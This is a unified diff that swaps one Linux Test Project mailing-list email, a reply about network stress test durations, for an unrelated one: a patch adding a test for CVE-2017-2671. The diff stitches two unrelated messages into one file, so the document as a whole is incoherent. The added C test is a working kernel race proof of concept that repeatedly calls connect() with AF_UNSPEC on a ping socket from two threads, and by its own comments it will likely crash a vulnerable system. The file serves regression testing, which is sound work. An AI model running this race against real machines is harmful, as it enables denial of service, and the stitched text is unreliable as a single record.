@@ -1,34 +1,188 @@
-From: Petr Vorel <pvorel@suse.cz>
-Date: Mon, 24 Jul 2017 10:46:33 +0200
-Subject: [LTP] [PATCH] network/stress: Reduce the default number of
- cycles for various tests
-In-Reply-To: <6f6abb62-d010-0919-a9b3-61c0f5c8477a@oracle.com>
-References: <20170626082935.2868-1-pvorel@suse.cz>
- <6f6abb62-d010-0919-a9b3-61c0f5c8477a@oracle.com>
-Message-ID: <20170724084633.aymvx2vcfjknfgjn@dell5510>
+From: Richard Palethorpe <rpalethorpe@suse.com>
+Date: Mon, 24 Jul 2017 10:53:06 +0200
+Subject: [LTP] [PATCH v4] Test for CVE-2017-2671 on ping sockets
+In-Reply-To: <20170720120807.GE32092@rei>
+References: <20170720120807.GE32092@rei>
+Message-ID: <20170724085306.11529-1-rpalethorpe@suse.com>
 List-Id: <ltp.lists.linux.it>
 MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
 To: ltp@lists.linux.it
 
-Hi Alexey,
-> >  # network/stress tests require additional parameters
-> >  export NS_DURATION="${NS_DURATION:-3600}"
+Signed-off-by: Richard Palethorpe <rpalethorpe@suse.com>
+---
 
-> What about changing NS_DURATION as well? If I remember correctly
-> it's one hour for each test-case in 'Application' & 'broken_ip'
-> groups.
+V4 - Move socket creation and destruction to setup and cleanup. Also fix Makefile.
 
-I agree. How about changing it to 720?
+ runtest/cve                   |   1 +
+ testcases/cve/.gitignore      |   1 +
+ testcases/cve/Makefile        |   3 ++
+ testcases/cve/cve-2017-2671.c | 121 ++++++++++++++++++++++++++++++++++++++++++
+ 4 files changed, 126 insertions(+)
+ create mode 100644 testcases/cve/cve-2017-2671.c
 
-I repeated this commit to my 7th version of "Simplify network setup + fix some network
-stress tests" patchset [1]. If this is the only change in this patchset, could you please
-change the value of NS_DURATION yourself? (There probably will be some changes, so I'll
-fix it myself. But just in case to prevent me send v8 if there is no change).
+diff --git a/runtest/cve b/runtest/cve
+index ee0614a9c..32a39cf80 100644
+--- a/runtest/cve
++++ b/runtest/cve
+@@ -4,5 +4,6 @@ cve-2014-0196 cve-2014-0196
+ cve-2016-4997 cve-2016-4997
+ cve-2016-5195 dirtyc0w
+ cve-2016-7117 cve-2016-7117
++cve-2017-2671 cve-2017-2671
+ cve-2017-5669 cve-2017-5669
+ cve-2017-6951 cve-2017-6951
+diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
+index bdb73f33b..1577cf914 100644
+--- a/testcases/cve/.gitignore
++++ b/testcases/cve/.gitignore
+@@ -2,5 +2,6 @@ cve-2012-0957
+ cve-2014-0196
+ cve-2016-4997
+ cve-2016-7117
++cve-2017-2671
+ cve-2017-6951
+ cve-2017-5669
+diff --git a/testcases/cve/Makefile b/testcases/cve/Makefile
+index 31f19d871..04abc1f9c 100644
+--- a/testcases/cve/Makefile
++++ b/testcases/cve/Makefile
+@@ -25,4 +25,7 @@ cve-2016-7117:	LDLIBS += -lrt
+ cve-2014-0196:  CFLAGS += -pthread
+ cve-2014-0196:  LDLIBS += -lrt -lutil
+ 
++cve-2017-2671:	CFLAGS += -pthread
++cve-2017-2671:	LDLIBS += -lrt
++
+ include $(top_srcdir)/include/mk/generic_leaf_target.mk
+diff --git a/testcases/cve/cve-2017-2671.c b/testcases/cve/cve-2017-2671.c
+new file mode 100644
+index 000000000..21485121d
+--- /dev/null
++++ b/testcases/cve/cve-2017-2671.c
+@@ -0,0 +1,121 @@
++/*
++ * Copyright (c) 2017 Richard Palethorpe <rpalethorpe@suse.com>
++ * Original POC by Daniel Jiang
++ *
++ * This program is free software: you can redistribute it and/or modify
++ * it under the terms of the GNU General Public License as published by
++ * the Free Software Foundation, either version 2 of the License, or
++ * (at your option) any later version.
++ *
++ * This program is distributed in the hope that it will be useful,
++ * but WITHOUT ANY WARRANTY; without even the implied warranty of
++ * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
++ * GNU General Public License for more details.
++ *
++ * You should have received a copy of the GNU General Public License
++ * along with this program. If not, see <http://www.gnu.org/licenses/>.
++ */
++/*
++ * Test for CVE-2017-2671 faulty locking on ping socket
++ *
++ * When sys_connect() is called with sockaddr.sin_family set to AF_UNSPEC on a
++ * ping socket; __udp_disconnect() gets called, which in turn calls the buggy
++ * function ping_unhashed(). This function does not obtain a rwlock before
++ * checking if the socket is hashed allowing the socket data to be pulled from
++ * underneath it in the time between calling sk_hashed() and gaining the write
++ * lock.
++ *
++ * Fixed in commit 43a6684519ab0a6c52024b5e25322476cabad893
++ *
++ * This test repeatedly 'connects' a ping socket correctly then calls
++ * connect() with AF_UNSPEC in two seperate threads to trigger the race
++ * condition. If the bug is present, then the test will most likely crash the
++ * system.
++ *
++ * The test requests root privileges so that it can ensure ping sockets are
++ * enabled. On distributions (including Android) where ping sockets are
++ * enabled by default, root privileges are not required.
++ */
++
++#include <stdio.h>
++#include <sys/socket.h>
++#include <arpa/inet.h>
++#include <stdlib.h>
++
++#include "tst_test.h"
++#include "tst_safe_net.h"
++#include "tst_safe_pthread.h"
++
++#include "tst_fuzzy_sync.h"
++
++#define ATTEMPTS 0xFFFF
++#define PING_SYSCTL_PATH "/proc/sys/net/ipv4/ping_group_range"
++
++static int sockfd;
++static unsigned int ping_min_grp = 1, ping_max_grp;
++static struct tst_fzsync_pair fzsync_pair = TST_FZSYNC_PAIR_INIT;
++static struct sockaddr_in iaddr, uaddr;
++
++static void setup(void)
++{
++	iaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
++	uaddr = iaddr;
++	iaddr.sin_family = AF_INET;
++	uaddr.sin_family = AF_UNSPEC;
++	fzsync_pair.delay_inc = 1;
++
++	SAFE_FILE_SCANF(PING_SYSCTL_PATH, "%u %u",
++			&ping_min_grp, &ping_max_grp);
++	SAFE_FILE_PRINTF(PING_SYSCTL_PATH, "0 0");
++
++	sockfd = SAFE_SOCKET(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
++	tst_res(TINFO, "Created ping socket, attempting to race...");
++}
++
++static void cleanup(void)
++{
++	SAFE_CLOSE(sockfd);
++	if (ping_min_grp | ping_max_grp)
++		SAFE_FILE_PRINTF(PING_SYSCTL_PATH, "%u %u",
++				 ping_min_grp, ping_max_grp);
++}
++
++static void *connect_b(void * param LTP_ATTRIBUTE_UNUSED)
++{
++	tst_fzsync_delay_b(&fzsync_pair);
++	connect(sockfd, (struct sockaddr *)&uaddr, sizeof(uaddr));
++	tst_fzsync_time_b(&fzsync_pair);
++
++	return 0;
++}
++
++static void run(void)
++{
++	pthread_t thrd;
++	int i;
++
++	for (i = 0; i < ATTEMPTS; i++) {
++		SAFE_CONNECT(sockfd,
++			     (struct sockaddr *)&iaddr, sizeof(iaddr));
++		SAFE_PTHREAD_CREATE(&thrd, 0, connect_b, 0);
++
++		tst_fzsync_delay_a(&fzsync_pair);
++		connect(sockfd, (struct sockaddr *)&uaddr, sizeof(uaddr));
++		tst_fzsync_time_a(&fzsync_pair);
++
++		SAFE_PTHREAD_JOIN(thrd, 0);
++		tst_fzsync_pair_update(i, &fzsync_pair);
++
++		if (!(i & 0x7FFF))
++			tst_fzsync_pair_info(&fzsync_pair);
++	}
++
++	tst_res(TPASS, "We didn't crash");
++}
++
++static struct tst_test test = {
++	.setup = setup,
++	.test_all = run,
++	.cleanup = cleanup,
++	.needs_root = 1,
++};
+-- 
+2.13.2
 
-
-Kind regards,
-Petr
-
-[1]: http://lists.linux.it/pipermail/ltp/2017-July/005075.html
